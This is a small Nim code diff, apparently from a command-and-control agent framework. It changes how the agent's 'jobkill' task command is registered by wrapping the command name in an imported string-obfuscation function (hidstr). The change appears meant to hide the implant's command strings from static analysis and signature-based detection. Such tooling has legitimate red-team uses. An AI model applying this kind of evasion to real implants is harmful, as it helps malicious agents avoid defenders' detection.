@@ -2,6 +2,7 @@ import std/[json, strutils]
 import core/types
 import core/jobs
 import commands/registry
+import crypto/strenc
 
 proc jobkillExecute(taskId: string, params: JsonNode, state: AgentState,
                     send: SendMsg): TaskResult =
@@ -17,4 +18,4 @@ proc jobkillExecute(taskId: string, params: JsonNode, state: AgentState,
                     status: "success", completed: true)
 
 proc initJobkill*() =
-  register("jobkill", jobkillExecute)
+  register(hidstr("jobkill"), jobkillExecute)
